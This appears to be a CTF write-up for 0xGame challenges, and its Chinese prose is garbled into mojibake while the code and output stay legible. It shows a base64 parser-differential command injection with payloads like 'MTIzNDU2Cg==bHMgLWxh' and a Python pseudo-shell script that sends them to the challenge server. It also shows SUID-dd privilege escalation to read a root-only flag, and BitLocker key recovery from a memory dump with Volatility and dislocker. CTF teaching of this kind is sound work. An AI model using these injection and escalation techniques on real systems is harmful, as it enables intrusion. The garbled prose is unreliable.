å°±åƒä¸Šé¢æˆªå›¾ï¼Œå¯ä»¥è§‚å¯Ÿåˆ° shell çš„ base64 è§£å¯†å·¥å…·ä¼šçµæ´»å°†æ‰€æœ‰ç¼–ç è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒè®¤å®šè¦è§£ç çš„å†…å®¹ä¸€ç›´åˆ°æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åå…³æ³¨ python çš„ base64 åº“ï¼Œä¼šå‘ç°å®ƒé‡åˆ°=å·å¡«å……çš„æ—¶å€™åœæ­¢ç»§ç»­è¯»å–

å…³æ³¨è¿™éƒ¨åˆ†æ ¸å¿ƒå‡½æ•°ï¼Œä¼šå‘ç°å®¹å™¨å…ˆæ˜¯è¿›è¡Œ python çš„ base64 åº“çš„è§£ç ï¼Œä¼šå¯¹è§£ç çš„å€¼è¿›è¡Œæ­£åˆ™åŒ¹é…ï¼Œåªèƒ½å‡ºç°å­—æ¯ï¼Œæ•°å­—ï¼Œä¸‹åˆ’çº¿ï¼Œè€Œè¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬ä¸èƒ½è¾“å…¥å¸¦å‚æ•°çš„å‘½ä»¤ï¼ˆç©ºæ ¼å°±ç»•ä¸å¼€

ä½†æ˜¯è½¬æŠ˜ç‚¹åˆæ¥äº†ï¼Œæœ€åæ‰§è¡Œè§£ç å‘½ä»¤çš„æ—¶å€™ï¼Œæ˜¯ç”¨çš„ç³»ç»Ÿ base64 å‘½ä»¤ï¼Œè¿™é‡Œå°±èƒ½æƒ³åˆ°ç»•è¿‡ python åº“çš„æ–¹æ³•äº†ï¼Œå‰åè¿›è¡Œä¸¤ä¸ª base64 ç¼–ç æ‹¼æ¥

```bash
yolo@yolo:~$ echo "123456" | base64
MTIzNDU2Cg==
yolo@yolo:~$ echo -n "ls -la" | base64
bHMgLWxh
yolo@yolo:~$ nc nc1.ctfplus.cn 33905
Welcome to Base64 Decoder Challenge!
Please input your base64 data. I will decode it for you.
> MTIzNDU2Cg==bHMgLWxh
base64-decoded data: 123456
total 16
drwxrwxrwx 1 root root 4096 Oct 14 13:40 .
drwxr-xr-x 1 root root 4096 Oct 14 13:38 ..
-rwxr-xr-x 1 root root 1596 Oct  4 07:31 app.py
-rw-r--r-- 1 ctf  ctf    20 Oct 14 15:01 tmpfile

>
```

è¿™é‡Œå…³äºåˆ›é€ çš„ä¸¤ä¸²å°ç¼–ç ï¼Œæˆ‘ç»™ç®€å•è§£é‡Šä¸‹ä¸‹ï¼Œå¸¦äº†-n çš„é‚£ä¸ªä¼šè‡ªåŠ¨å¸®æˆ‘ä»¬æŠŠæ¢è¡Œç¬¦åˆ é™¤æ‰ï¼Œå¦‚æœä¸å¸¦çš„è¯ï¼Œecho ä¼šè‡ªåŠ¨ç»™æˆ‘ä»¬è¡¥å……æ¢è¡Œç¬¦ï¼Œè¿™ä¹Ÿå°±æ˜¯ä¸ºå•¥ 6 ä¸ªå­—æ¯ï¼Œä¸€å®šä¼šå‡ºç°ç­‰å·å¡«å……ï¼Œï¼ˆ8 ä¸ªå­—ç¬¦çš„è¯å°±ä¸ä¼šï¼Œå…·ä½“ç»†èŠ‚å‚è€ƒ week2 çš„è€ƒæ³•ï¼‰

ç„¶åæˆ‘å»ºè®®æ¥ä¸‹æ¥æ“ä¸ªå°çš„äº¤äº’è„šæœ¬

```python
import socket
import base64
import sys

HOST = 'nc1.ctfplus.cn'
PORT = 33905
PREFIX_PAYLOAD = b'MTIzNDU2Cg==' 


def execute_command(command):

    try:
        full_command = f"{command}"
        encoded_command = base64.b64encode(full_command.encode()).decode()


        final_payload = PREFIX_PAYLOAD.decode() + encoded_command + '\n'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        welcome_msg = s.recv(1024).decode()

        s.recv(1024)

        s.sendall(final_payload.encode())

        output = b''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            output += chunk

            if output.endswith(b'> '):
                output = output[:-2] 
                break

        s.close()

        decoded_output = output.decode()

        start_tag = "base64-decoded data: "
        if start_tag in decoded_output:
            result_start = decoded_output.find(start_tag) + len(start_tag)
            result = decoded_output[result_start:].strip()

            result_lines = result.split('\n')
            if result_lines and result_lines[0].strip() == '123456':
                return '\n'.join(result_lines[1:]).strip()
            
            return result
        
        return decoded_output.strip()

    except Exception as e:
        return f"Error: {e}"

def main():
    print(f"--- CTF Pseudo-Terminal [{HOST}:{PORT}] ---")
    print("è¾“å…¥ 'exit' æˆ– 'quit' é€€å‡º")
    
    while True:
        try:
            cmd = input("shell> ").strip()
            
            if cmd.lower() in ['exit', 'quit']:
                print("é€€å‡ºç»ˆç«¯ã€‚")
                break
            
            if not cmd:
                continue

            print("--- å‘½ä»¤æ‰§è¡Œä¸­... ---")
            result = execute_command(cmd)
            print(result)

        except KeyboardInterrupt:
            print("\né€€å‡ºç»ˆç«¯ã€‚")
            break

if __name__ == '__main__':
    main()
```

> å…³äº python è§£é‡Šå™¨çš„å·®å¼‚ï¼Œç»å¸¸ç”¨åº”è¯¥å°±ä¼šå‘ç°ï¼ˆä¹‹å‰ä¸çŸ¥é“çš„ï¼Œè¿™æ¬¡çŸ¥é“å°±å¥½äº†ï¼Œå…¶å®æˆ‘ä¹Ÿæ˜¯ç°å­¦çš„

#### ææƒ

é€šè¿‡è¿™ä¸ªæ¨¡æ‹Ÿ shellï¼Œæˆ‘ä»¬äº¤äº’ï¼Œå‘ç°æ ¹ç›®å½•ä¸‹çš„ flag æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–,æ¥ä¸‹æ¥æŸ¥æ‰¾ suid æ–‡ä»¶ï¼Œæ‰¾åˆ°äº† ddï¼Œå®Œå…¨å¯ä»¥ç”¨å®ƒè¿›è¡Œææƒ

```plain
find / -perm -u=s -type f 2>/dev/null
```

å‘½ä»¤è¯¦è§£ï¼š

* find /

* * æ–‡ä»¶æœç´¢å‘½ä»¤ï¼Œä»æ ¹ç›®å½•å¼€å§‹æŸ¥æ‰¾

* -perm -u=s

* * -perm æ˜¯æŒ‰ç…§æƒé™æ¨¡å¼æŸ¥æ‰¾

  * -u=sï¼šu è¡¨ç¤ºç”¨æˆ·ï¼Œs è¡¨ç¤ºâ€œSetUID"ä½ï¼Œ-å‰ç¼€è¡¨ç¤ºâ€åŒ…å«è¿™äº›æƒé™ä½â€œï¼Œä¸è¦æ±‚å®Œå…¨åŒ¹é…

  * suid ææƒæ˜¯è¯´å½“æ™®é€šç”¨æˆ·æ‰§è¡Œå…·æœ‰ suid ä½ç¨‹åºæ—¶ï¼Œç¨‹åºä¼šä»¥æ–‡ä»¶æ‰€æœ‰è€…çš„æƒé™è¿è¡Œï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œç³»ç»Ÿåªæœ‰ root ç”¨æˆ·æ‰èƒ½è®¾ç½® SUID ä½ç¨‹åº

* -type f

* * åªæŸ¥æ‰¾æ™®é€šæ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ç›®å½•ã€è®¾å¤‡æ–‡ä»¶ç­‰ï¼‰

* 2>/dev/null

* * é”™è¯¯å¤„ç†ï¼Œåªéœ€è¦è®°ä½è¿™æ ·åšä¼šè®© Linux è¾“å‡ºæ²¡æœ‰ä»»ä½•æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥è®©è¾“å‡ºæ›´æ¸…æ™°

ä¸ä¸Šé¢ç±»ä¼¼çš„æŸ¥æ‰¾ suid æƒé™çš„å‘½ä»¤æœ‰

```bash
find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} \;
```

è„šæœ¬æ‰§è¡Œéƒ¨åˆ†æˆªå–ï¼š

```bash
shell> ls -la /
--- å‘½ä»¤æ‰§è¡Œä¸­... ---
total 64
drwxr-xr-x    1 root root 4096 Oct 14 13:38 .
drwxr-xr-x    1 root root 4096 Oct 14 13:38 ..
drwxrwxrwx    1 root root 4096 Oct 14 13:40 app
lrwxrwxrwx    1 root root    7 Aug 24 16:20 bin -> usr/bin
drwxr-xr-x    2 root root 4096 Aug 24 16:20 boot
drwxr-xr-x    5 root root  360 Oct 14 13:38 dev
drwxr-xr-x    1 root root 4096 Oct 14 13:38 etc
-r--------    1 root root   31 Oct  3 13:39 flag
drwxr-xr-x    1 root root 4096 Oct  3 15:20 home
lrwxrwxrwx    1 root root    7 Aug 24 16:20 lib -> usr/lib
lrwxrwxrwx    1 root root    9 Aug 24 16:20 lib64 -> usr/lib64
drwxr-xr-x    2 root root 4096 Sep 29 00:00 media
drwxr-xr-x    2 root root 4096 Sep 29 00:00 mnt
drwxr-xr-x    2 root root 4096 Sep 29 00:00 opt
dr-xr-xr-x 1444 root root    0 Oct 14 13:38 proc
drwx------    1 root root 4096 Sep 30 00:32 root
drwxr-xr-x    1 root root 4096 Oct  3 15:20 run
lrwxrwxrwx    1 root root    8 Aug 24 16:20 sbin -> usr/sbin
drwxr-xr-x    2 root root 4096 Sep 29 00:00 srv
dr-xr-xr-x   13 root root    0 Oct  3 16:05 sys
drwxrwxrwt    2 root root 4096 Sep 29 00:00 tmp
drwxr-xr-x    1 root root 4096 Sep 29 00:00 usr
drwxr-xr-x    1 root root 4096 Sep 29 00:00 var
shell> find / -perm -u=s -type f 2>/dev/null
--- å‘½ä»¤æ‰§è¡Œä¸­... ---
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/dd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
shell> dd if=/flag
--- å‘½ä»¤æ‰§è¡Œä¸­... ---
0xGame{BasE64_Dec0der_w1th_DD}
shell> 
```

> å…³äº suid ææƒå¸¸è§çš„å‘½ä»¤ï¼Œè¿™é‡Œæœ‰ä¸ªæ±‡æ€»ç½‘ç«™ï¼Œè¯·å¤§å®¶è‡ªè¡Œæ¢ç´¢<https://gtfobins.github.io/gtfobins/>\
> å»ºè®®è§è¿‡ä¸€æ¬¡å°±æŒæ¡ä¸€æ¬¡ï¼Œæˆ‘ä»¬åé¢å­¦ä¹ æ¸—é€æ—¶å€™ï¼Œææƒç»å¸¸ä¼šç”¨åˆ°

### Bitlocker å®‰å…¨å—ï¼Ÿ

æœ¬é¢˜ä¸»è¦æ˜¯è€ƒå¯Ÿäº†å†…å­˜å–è¯ï¼Œå…ˆç®€è¿°ä¸€ä¸‹ç†è®ºä¾æ®ï¼Œæˆ‘ä»¬è¿›è¡Œ BitLocker ç£ç›˜è§£å¯†åï¼ˆå°±æ˜¯è¯´ BitLocker ä¿æŠ¤çš„ç£ç›˜æ­£åœ¨è¢«ä½¿ç”¨æ—¶ï¼‰ï¼Œé‚£ä¹ˆè§£å¯†å¯†é’¥çš„æŸäº›å½¢å¼å°±å¿…é¡»å­˜åœ¨äº`è®¡ç®—æœºçš„æ˜“å¤±æ€§å†…å­˜ï¼ˆRAMï¼‰`ä¸­

> ä¸‹é¢çš„éƒ¨åˆ†åŸç†æ¥è‡ª Gemini è€å¸ˆ

#### BitLocker å¯†é’¥ä½“ç³»

BitLocker åŠ å¯†é€šå¸¸æ¶‰åŠè‡³å°‘ä¸‰ä¸ªä¸»è¦çš„å¯†é’¥å±‚çº§ï¼š

* **å…¨å·åŠ å¯†å¯†é’¥ (Full Volume Encryption Key, FVEK):** è¿™æ˜¯ç›´æ¥ç”¨äºåŠ å¯†å’Œè§£å¯†ç£ç›˜ä¸Šæ•°æ®çš„å¯†é’¥ã€‚

* **å·ä¸»å¯†é’¥ (Volume Master Key, VMK):** FVEK æ˜¯ç”± VMK åŠ å¯†çš„ã€‚åŠ å¯†åçš„ FVEK å­˜å‚¨åœ¨ BitLocker ç£ç›˜çš„å…ƒæ•°æ®ä¸­ã€‚

* **ä¿æŠ¤å™¨ (Protectors):** VMK æ˜¯ç”±ä¸€ä¸ªæˆ–å¤šä¸ªâ€œä¿æŠ¤å™¨â€åŠ å¯†çš„ã€‚ä¿æŠ¤å™¨å¯ä»¥æ˜¯ç”¨æˆ·çš„å¯†ç ã€TPMï¼ˆå¯ä¿¡å¹³å°æ¨¡å—ï¼‰ã€æ¢å¤å¯†é’¥ (Recovery Key) æˆ–å¯åŠ¨ PIN ç­‰ã€‚åŠ å¯†åçš„ VMK ä¹Ÿå­˜å‚¨åœ¨ç£ç›˜å…ƒæ•°æ®ä¸­ã€‚

#### å¯†é’¥è§£å¯†åŠ è½½è¿‡ç¨‹

å½“ BitLocker ä¿æŠ¤çš„ç£ç›˜éœ€è¦è¢«è®¿é—®ï¼ˆå³è§£é”ï¼‰æ—¶ï¼Œç³»ç»Ÿä¼šè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

1. ç”¨æˆ·æä¾›å¯†ç ã€PIN æˆ– TPM éªŒè¯é€šè¿‡ï¼ˆä½¿ç”¨æŸä¸ªä¿æŠ¤å™¨ï¼‰ã€‚

2. ä¿æŠ¤å™¨ç”¨äºè§£å¯†å­˜å‚¨åœ¨ç£ç›˜å…ƒæ•°æ®ä¸­çš„ **VMK**ï¼Œå¾—åˆ°**æ˜æ–‡ VMK**ã€‚

3. **æ˜æ–‡ VMK** ç”¨äºè§£å¯†å­˜å‚¨åœ¨ç£ç›˜å…ƒæ•°æ®ä¸­çš„ **FVEK**ï¼Œå¾—åˆ°**æ˜æ–‡ FVEK**ã€‚

4. **æ˜æ–‡ FVEK**ï¼ˆæˆ–ç”¨äºæ•°æ®åŠ è§£å¯†çš„æ›´ä½çº§åˆ«çš„å­å¯†é’¥ï¼‰ä¼šè¢«åŠ è½½åˆ°è®¡ç®—æœºçš„**å†…å­˜ï¼ˆRAMï¼‰**ä¸­ï¼Œä¾›ç£ç›˜é©±åŠ¨ç¨‹åºå®æ—¶è¿›è¡Œæ•°æ®çš„åŠ å¯†å’Œè§£å¯†æ“ä½œã€‚

> è¿™é‡Œå°±è¦å…³æ³¨äº†ï¼Œä¸€æ—¦è·å–äº†å†…å­˜é•œåƒï¼Œæ˜¯æœ‰åŠæ³•æ¢å¤ FVEK çš„

å› æ­¤ï¼Œæœ¬é¢˜çš„å¸¸è§„è§£æ³•æ˜¯ä½¿ç”¨ Volatility è¿›è¡Œå†…å­˜å–è¯ï¼Œ**ç›´æ¥æå–å‡º FVEK**ã€‚è¿™æ˜¯å› ä¸º FVEK æ˜¯ç›´æ¥ç”¨äºç£ç›˜åŠ è§£å¯†çš„å¯†é’¥ï¼Œä¸€æ—¦è·å–ï¼Œå°±å¯ä»¥ç»•è¿‡ç£ç›˜å…ƒæ•°æ®ä¸­çš„ VMK å’Œä¿æŠ¤å™¨ï¼Œç›´æ¥ä½¿ç”¨ `dislocker` ç­‰å·¥å…·å¯¹åŠ å¯†ç£ç›˜è¿›è¡Œè§£å¯†ã€‚"

æ¨èè¿™ä¸¤ä¸ªæ’ä»¶ä»“åº“ï¼Œä¸Šé¢æ˜¯ vol3 çš„ï¼Œä¸‹é¢æ˜¯ vol2 çš„ï¼Œä»“åº“é‡Œéƒ½æœ‰è¯¦ç»†ä½¿ç”¨æ–¹æ³•ï¼Œè‡ªå·±çœ‹çœ‹

```plain
https://github.com/lorelyai/volatility3-bitlocker
https://github.com/breppo/Volatility-BitLocker
```

#### how to solve(ä»¥ vol2 ä¸ºä¾‹)

```bash
~$ python vol.py -f ~/Desktop/timu/0xGame/memdump.mem imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_10240_17770, Win10x64
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/yolo/Desktop/timu/0xGame/memdump.mem)
                      PAE type : No PAE
                           DTB : 0x1aa000L
                          KDBG : 0xf802b938bb20L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff802b93e5000L
                KPCR for CPU 1 : 0xffffd00040e75000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2025-08-04 06:32:18 UTC+0000
     Image local date and time : 2025-08-04 14:32:18 +0800
```

`imageinfo`å‘½ä»¤æ˜¯ vol2 æœ€å¸¸ç”¨çš„æ’ä»¶ä¹‹ä¸€ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬è¯†åˆ«å†…å­˜é•œåƒæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œå¤§è‡´åŸç†æ˜¯è¯¥æ’ä»¶ä¼šæ‰«æå†…å­˜ dump ä¸­çš„å…³é”®ç»“æ„ï¼ˆå¦‚ KDBGï¼‰ï¼Œå¹¶ä¼šç»™æˆ‘ä»¬ç»™å‡ºä¸€ä¸ªæˆ–å¤šä¸ª profileï¼ŒWindows è¿˜å¥½ï¼Œprofile å°±é‚£ä¹ˆå‡ ç§ï¼ŒLinux çš„è¯ï¼Œæœ‰çš„é¢˜è¿˜éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ¶ä½œ profileï¼Œæƒ³å­¦ä¹ çš„è¯ï¼Œå‚è€ƒå»å¹´ nctf çš„**è°åŠ¨äº†æˆ‘çš„ mc**ï¼Œè€ƒå¯Ÿäº† Linux çš„å†…å­˜å–è¯

æ¥ä¸‹æ¥çš„å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ·»åŠ å‚æ•°`--profile=<profile>`å»è¿è¡Œå…¶ä»– vol æ’ä»¶

> å¤§å®¶å¯ä»¥ç†è§£ profile æ˜¯ä¸€ä¸ªç³»ç»Ÿçš„å­—å…¸\
> æœ¬è´¨ä¸Šï¼Œå®ƒæ˜¯ç‰¹å®šæ“ä½œç³»ç»Ÿå†…æ ¸çš„æ•°æ®ç»“æ„å®šä¹‰å’Œç¬¦å·è¡¨ä¿¡æ¯çš„é›†åˆ\
> æ ¸å¿ƒä½œç”¨ï¼š\
> è¿›è¡Œå–è¯åˆ†æçš„æ—¶å€™ï¼Œå¿…é¡»æŒ‡å®šåˆé€‚çš„ profileï¼Œä¸åŒæ“ä½œç³»ç»Ÿçš„é…ç½®å·®å¼‚å¾ˆå¤§\
> \
> \
> \
> å®šä½å…³é”®æ•°æ®\
> æ­£ç¡®è§£ææ•°æ®\
> åŒ¹é…æ“ä½œç³»ç»Ÿ

```bash
~$ mkdir -p ~/Desktop/timu/dislockerkeys
```

è¿™ä¸ªå‘½ä»¤æ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ–‡ä»¶å¤¹

æ˜¯ä¸ºä¸‹ä¸€æ¡å‘½ä»¤æŸ¥åˆ°å¯†é’¥åä¿å­˜å¯¹åº”å¯†é’¥æ–‡ä»¶ç”¨çš„

```bash
~$ python vol.py -f ~/Desktop/timu/0xGame/memdump.mem --profile=Win10x64 bitlocker --dislocker ~/Desktop/timu/dislockerkeys
Volatility Foundation Volatility Framework 2.6.1

[FVEK] Address : 0xe0008763dd60
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 3d5066272ffd39729d213cbcf989c9a13bf189c9e3e3f48a4c65b82ec4b12750
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe0008763dd60-Dislocker.fvek



[FVEK] Address : 0xe00089569000
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 0000000000000000000000000000000000000000000000000000000000000000
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089569000-Dislocker.fvek



[FVEK] Address : 0xe00089569d60
[FVEK] Cipher  : AES 256-bit (Win 8+)
[FVEK] FVEK: 0000000000000000000000000000000000000000000000000000000000000000
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089569d60-Dislocker.fvek



[FVEK] Address : 0xe000899f7680
[FVEK] Cipher  : AES 128-bit (Win 8+)
[FVEK] FVEK: a7b78f9c9e746105a3716704890c3dbf
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe000899f7680-Dislocker.fvek



[FVEK] Address : 0xe00089b5ad60
[FVEK] Cipher  : AES 128-bit (Win 8+)
[FVEK] FVEK: a7b78f9c9e746105a3716704890c3dbf
[DISL] FVEK for Dislocker dumped to file: /home/yolo/Desktop/timu/dislockerkeys/0xe00089b5ad60-Dislocker.fvek
```

å­˜åœ¨å†…å­˜é‡Œçš„ fvek æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶å–”ï¼Œç”¨æ’ä»¶è¿è¡Œå‡ºæ¥çš„ç»“æœçœ‹ä¸Šå»æ˜¯åå…­è¿›åˆ¶æ˜æ–‡ï¼Œå®è´¨ä¸Šä»…ä»…æˆªå–äº†éƒ¨åˆ† fvek ä¿¡æ¯ï¼Œç”¨æ¥åŒºåˆ†ç”¨çš„ï¼Œæˆ‘ä»¬åé¢è¦ç”¨çš„æ˜¯ä¿å­˜åœ¨ dislockerkeys ä¸‹çš„ fvek æ–‡ä»¶

![image-20251015184612011](/img/0xgame2025/image-20251015184612011.png)

ä»”ç»†è§‚å¯Ÿä¸Šé¢çš„ vol å‘½ä»¤çš„è¾“å‡ºï¼Œä¼šå‘ç°è¿™é‡Œä¸åŒåœ°å€æå–å‡ºæ¥çš„å¯†é’¥ä¸åŒ,ç„¶åå†ä»”ç»†è§‚å¯Ÿï¼Œå‘ç°å‡ºç°å‡ ä¸ª 0000 çš„ fvekï¼Œè¿™ç§å°±æ˜¯æ— æ•ˆï¼Œä¸»è¦åŸå› æ˜¯æ’ä»¶ä¼šå¸®åŠ©æˆ‘ä»¬å°†æ‰€æœ‰å¯èƒ½çš„ fvek æå–å‡ºæ¥ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦æˆ‘ä»¬è¿›è¡Œå°è¯•ï¼ŒæŠŠæ­£ç¡®çš„ fvek æ‰¾å‡ºæ¥

ä½†åœ¨æ­¤ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ™®åŠä¸ªå°çŸ¥è¯†ç‚¹

```bash
~$ fdisk -l ~/Desktop/timu/0xGame/0xGame.dd
Disk /home/yolo/Desktop/timu/0xGame/0xGame.dd: 100 MiB, 104857600 bytes, 204800 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x257160c5

Device                                    Boot Start    End Sectors Size Id Type
/home/yolo/Desktop/timu/0xGame/0xGame.dd1        128 198783  198656  97M  7 HPFS/NTFS/exFAT
```

ç ”ç©¶è¿‡æˆ‘ week1 å‡ºçš„ do_not_enterï¼Œåº”è¯¥è¦å­¦åˆ°ï¼Œä¸€ä¸ª dd é•œåƒé‡Œé¢ä¼šæœ‰å¤šä¸ªåˆ†åŒºï¼Œæ¯”å¦‚æœ¬é¢˜ï¼Œæˆ‘åœ¨æ‰“é•œåƒçš„æ—¶å€™ï¼Œæ˜¯å®Œæ•´çš„ç£ç›˜é•œåƒï¼Œé‡Œé¢ç”šè‡³åŒ…å«åˆ†åŒºè¡¨ï¼Œç„¶å BitLocker åŠ å¯†çš„æ˜¯å‡ ä¸ªåˆ†åŒºä¸­çš„å…¶ä¸­ä¸€ä¸ª

ç®€å•è¯´è¯´ä¸Šé¢ fdisk å‘½ä»¤çš„ç»“æœï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ï¼Œdd é•œåƒä¸­ï¼Œæ¯ä¸ªæ‰‡åŒºæ˜¯ 512 å­—èŠ‚ï¼Œç„¶åçœ‹åˆ°ç£ç›˜ä¸­åªæœ‰ä¸€ä¸ªå­˜å‚¨æ–‡ä»¶çš„è®¾å¤‡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¦è¿›è¡Œè§£å¯†çš„åˆ†åŒºäº†ï¼Œä¼šçœ‹åˆ°å®ƒæ˜¯ä» 128 æ‰‡åŒºå¼€å§‹çš„ï¼Œç„¶åç®—ä¸€ä¸‹ï¼Œ`128*512=65536byte`ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæœ‰ BitLocker åŠ å¯†çš„åˆ†åŒºåœ¨æ•´ä¸ªé•œåƒçš„åç§»ä¸º 65536byteï¼Œåé¢æˆ‘ä»¬è§£å¯†çš„æ—¶å€™éœ€è¦æŒ‡å®šèµ·ç‚¹

```bash
~$ sudo mkdir -p /mnt/dislocker_tmp
~$ sudo mkdir -p /mnt/decrypted
```

è¿™é‡Œä¸€æ¬¡æ€§åˆ›å»ºä¸¤ä¸ªæŒ‚è½½æ–‡ä»¶å¤¹

* ç¬¬ä¸€ä¸ªæ˜¯`dislocker`çš„è¾“å‡ºå·

* * `dislocker`ä¼šåœ¨è¿™ä¸ªç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º`dislocker-file`çš„ç‰¹æ®Šæ–‡ä»¶ï¼ˆæˆ–è€…å«å®ƒè®¾å¤‡ï¼‰

  * è¿™ä¸ª`dislocker-file`æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„ NTFS å·ã€‚å®ƒçš„ä½œç”¨æ˜¯ï¼š`dislocker`åœ¨åå°å®æ—¶åœ°å¯¹åŠ å¯†æ•°æ®è¿›è¡Œè§£å¯†ï¼Œå¹¶å°†è§£å¯†åçš„æ•°æ®æµä»¥ NTFS æ–‡ä»¶ç³»ç»Ÿå½¢å¼å‘ˆç°ç»™æ“ä½œç³»ç»Ÿ

* ç¬¬äºŒä¸ªæ˜¯`NTFS`æŒ‚è½½å·

* * ç”±äº`dislocker-file`æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ ‡å‡†çš„ NTFS æ–‡ä»¶ç³»ç»Ÿå·ï¼Œéœ€è¦ä½¿ç”¨æ ‡å‡†çš„ mount å‘½ä»¤ï¼ˆé€šå¸¸æ˜¯`mount -o loop`æˆ–`mount -o ro`ï¼‰å°†å…¶ä½œä¸ºæ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ°ç¬¬äºŒä¸ªç›®æ ‡æ–‡ä»¶å¤¹ä¸­ï¼Œå®Œæˆè¿™ä¸€æ­¥åï¼Œæˆ‘ä»¬å°±å¯ä»¥æ­£å¸¸çš„åœ¨ç¬¬äºŒä¸ªæ–‡ä»¶å¤¹ä¸­è®¿é—®åŠ å¯†ç£ç›˜å†…éƒ¨çš„æ–‡ä»¶å†…å®¹

> å°æ±‡æ€»ï¼šå¯ä»¥ç†è§£æˆç¬¬ä¸€ä¸ªæ–‡ä»¶å¤¹æ˜¯åŠ å¯† dd é•œåƒè§£å¯†æ—¶å€™ç”¨çš„ï¼Œé‡Œé¢çš„å†…å®¹æ˜¯ç»™ç³»ç»Ÿçœ‹çš„ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è¯»ï¼Œä½†æ˜¯å®ƒç»™äº†ä¸€ä¸ªè¾“å‡ºï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªè¾“å‡ºå¯¼å…¥åˆ°å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œè¿™ä¼šå„¿æˆ‘ä»¬å°±èƒ½æ­£å¸¸è¯»å–äº†

```bash
~$ sudo dislocker -v --offset 65536 -k /home/yolo/Desktop/timu/dislockerkeys/0xe00089b5ad60-Dislocker.fvek -- ~/Desktop/timu/0xGame/0xGame.dd /mnt/dislocker_tmp
~$ sudo ls /mnt/dislocker_tmp/
dislocker-file
```

è¿™ä¸ªå‘½ä»¤å¾ˆé‡è¦ï¼Œæ˜¯è§£å¯† BitLocker å¿…ç”¨çš„ï¼Œé‡Œé¢éƒ¨åˆ†ç»†èŠ‚ç»™å¤§å®¶è§£é‡Šè¿‡äº†ï¼Œ-v æ˜¯è¦æ±‚ç»“æœè¯¦ç»†è¾“å‡ºï¼Œæ¯”å¦‚è¯´å“ªé‡Œå‡ºé—®é¢˜äº†ï¼Œè¿˜èƒ½é€šè¿‡æŠ¥é”™è¿›è¡Œä¿®å¤ï¼Œ--offset æ˜¯æŒ‡å®šåç§»ï¼Œå°±è¦æˆ‘ä»¬æŠŠä¸Šé¢è®¡ç®—çš„ç»“æœå†™ä¸Šï¼Œ-k æ˜¯æŒ‡å®šçš„æˆ‘ä»¬ç”¨ vol æå–çš„ fvek æ–‡ä»¶ï¼Œ--æ˜¯å¾ˆæ¨èçš„åˆ†éš”ç¬¦ï¼Œå®ƒå‘Šè¯‰ dislocker åé¢è·Ÿç€çš„å‚æ•°ä¸æ˜¯é€‰é¡¹ï¼Œè€Œæ˜¯è¾“å…¥æ–‡ä»¶ï¼ˆåŠ å¯†å·ï¼‰å’Œè¾“å‡ºæŒ‚è½½ç‚¹

è¿è¡Œç»“æŸåï¼Œä¼šçœ‹åˆ°è¾“å‡ºæ–‡ä»¶å¤¹ä¸‹å‡ºç°äº†`dislocker-file`ï¼Œå°±æ˜¯ä¸Šé¢è¯´çš„ ntfs å·ï¼ˆå·²ç»è§£å¯†å¥½äº†çš„ï¼Œæ„Ÿè§‰å¯ä»¥ç­‰ä»·æˆæ²¡æœ‰è¢«åŠ å¯†çš„ç£ç›˜

```bash
~$ sudo mount -o loop,ro -t ntfs-3g /mnt/dislocker_tmp/dislocker-file /mnt/d
ecrypted
```

è¿™æ˜¯å¾ˆå¸¸è§çš„ç£ç›˜æŒ‚è½½å‘½ä»¤äº†

* mount æ˜¯ç³»ç»Ÿçš„æŒ‚è½½å‘½ä»¤

